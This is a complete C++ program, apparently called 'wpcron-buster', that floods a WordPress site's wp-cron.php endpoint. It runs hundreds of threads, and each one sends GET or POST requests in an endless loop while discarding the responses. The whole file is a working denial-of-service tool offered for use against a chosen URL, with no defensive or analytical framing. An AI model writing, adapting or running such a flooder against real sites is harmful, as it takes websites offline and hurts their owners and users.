#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <thread>
#include <mutex> 
#include <cctype>

using namespace std;

string lower_string(const string& my_string);
size_t discard_data(void *ptr, size_t size, size_t nmemb, void *userdata);
void send_GET(const string& url, bool ssl);
void send_POST(const string& url, bool ssl);

mutex mtx;

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "wpcron-buster : Written by x64Dot\n ";
        cout << "Syntax: {program_name} {url} {threads} {request method} \n";
        cout << "Example: " << argv[0] << " http://example.com/wp-cron.php" << " 500 " << "GET\n";
        return 1;
    }

    string url = argv[1];
    const int num_threads = atoi(argv[2]);
    string method = lower_string(argv[3]);

    if (method == "get"){ 
        vector<thread> threads;
    
        for (int i = 0; i < num_threads; ++i) {
            threads.emplace_back(send_GET, url, url.rfind("https", 0) == 0);
        }

        for (auto& thread : threads) {
            thread.join();
        }   
    }
    else if (method == "post"){
        vector<thread> threads;
    
        for (int i = 0; i < num_threads; ++i) {
            threads.emplace_back(send_POST, url, url.rfind("https", 0) == 0);
        }

        for (auto& thread : threads) {
            thread.join();
        }   
    }

    else {
        cout << "Invalid HTTP method. POST and GET is only supported.";
        return 1;
    }


    return 0;
}


string lower_string(const string& my_string){
    string result = my_string; 
    for (int i = 0; i < result.size(); ++i) {
        result[i] = tolower(result[i]);
    }

    return result;
}

size_t discard_data(void *ptr, size_t size, size_t nmemb, void *userdata) {

    return size * nmemb; 
}

void send_GET(const string& url, bool ssl) {
    static int counter = 0;
    CURL *curl = curl_easy_init();

    if (curl) {
        while (true) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data);

            if (ssl) {
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
            }

            curl_easy_perform(curl);
            {
               lock_guard<mutex> lock(mtx); 
                if (counter == 0) {
                    cout << "Do CTRL C to stop the program." << endl;
                }

                counter++;
                
                cout << "\rGET requests sent: " << counter << flush;
            }
        }

        curl_easy_cleanup(curl);
    }
}

void send_POST(const string& url, bool ssl) {
    static int counter = 0;
    CURL *curl = curl_easy_init();

    if (curl) {
        while (true) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1);

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data);

            if (ssl) {
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
            }
          
            curl_easy_perform(curl);
            {
               lock_guard<mutex> lock(mtx); 
                if (counter == 0) {
                    cout << "Do CTRL C to stop the program." << endl;
                }

                counter++;
                
                cout << "\rPOST requests sent: " << counter << flush;
            }
        }

        curl_easy_cleanup(curl);
    }
}



